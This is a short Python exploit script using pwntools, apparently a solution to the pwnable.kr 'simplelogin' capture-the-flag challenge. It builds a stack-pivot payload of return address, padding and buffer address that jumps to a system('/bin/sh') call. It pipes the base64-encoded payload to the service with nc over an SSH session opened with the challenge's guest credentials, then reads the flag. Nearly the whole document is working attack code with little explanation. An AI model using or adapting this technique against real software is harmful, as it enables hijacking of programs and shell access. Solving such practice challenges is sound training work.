from pwn import ssh, p32, log
from base64 import b64encode
from time import sleep

# address of dword ptr [ESP]=>local_2c,s_/bin/sh_080da66f
# instruction before call to system() in correct()
payload = p32(0x08049284)

# 4 bytes of junk
payload += p32(0x61616161)

# address of input variable
payload += p32(0x811eb40-4)

attack = b"(echo -n '"
attack += b64encode(payload)
attack += b"'; cat) | nc 0 10019"


print("\nPayload: ", payload)
print("\nAttack: ", attack, "\n")

remote = ssh('simplelogin', 'pwnable.kr', password='guest', port=2222)
proc = remote.shell()

# program could be in a state of processing the payload at
# the time shell commands are sent, so a little delay is needed
proc.sendline(attack)
sleep(3)
proc.sendline(b"\n")
proc.sendline(b"cat flag")

flag = proc.recvrepeat(timeout=2)
log.success(flag)

proc.close()
remote.close()
